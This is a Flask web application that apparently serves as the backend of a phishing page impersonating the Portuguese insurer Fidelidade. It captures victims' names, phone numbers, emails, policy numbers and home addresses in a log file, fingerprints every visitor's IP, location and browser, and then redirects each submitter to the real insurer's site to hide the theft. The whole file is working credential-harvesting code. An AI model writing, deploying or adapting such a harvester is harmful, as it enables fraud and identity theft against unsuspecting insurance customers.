from flask import Flask, request, render_template, jsonify
import datetime
import os

app = Flask(__name__)
LOG_FILE = "form_log.txt"

@app.route("/", methods=["GET", "POST"])
def index():
    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if request.method == "POST":
        full_name = request.form.get("name")
        phone = request.form.get("phone")
        email = request.form.get("email")
        policy_number = request.form.get("insurance")
        address = request.form.get("address")
        postal_code = request.form.get("postal_code")
        description = request.form.get("description")

        log_entry = f"""
================== FORM SUBMISSION ==================
📅 Time        : {timestamp}
🌐 IP Address  : {ip_address}
🧭 User-Agent  : {user_agent}

👤 Full Name   : {full_name}
📱 Phone       : {phone}
📧 Email       : {email}
📄 Policy Nº   : {policy_number}
🏠 Address     : {address}
📮 Postal Code : {postal_code}
📝 Description : {description}
====================================================\n
"""
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        return "<script>window.location.href='https://www.fidelidade.pt';</script>"

    else:
        passive_log = f"""
[Passive Visit] {timestamp}
IP       : {ip_address}
UserAgent: {user_agent}
-------------------------------------------\n
"""
        with open(LOG_FILE, "a") as f:
            f.write(passive_log)

    return render_template("index.html")


@app.route("/tracker", methods=["POST"])
def tracker():
    try:
        data = request.get_json()
        log_entry = f"""
============ JS TRACKER (Passive Visitor) ============
🕓 Time        : {data.get('time')}
🌐 IP Address  : {data.get('ip')}
📍 Location    : {data.get('city')}, {data.get('country')}
🧭 Browser     : {data.get('browser')}
🗣 Language    : {data.get('language')}
💻 Platform    : {data.get('platform')}
🖥 Screen Size : {data['screen']['width']}x{data['screen']['height']}
🔗 Referrer    : {data.get('referrer')}
======================================================\n
"""
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        return jsonify({"status": "logged"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5050)
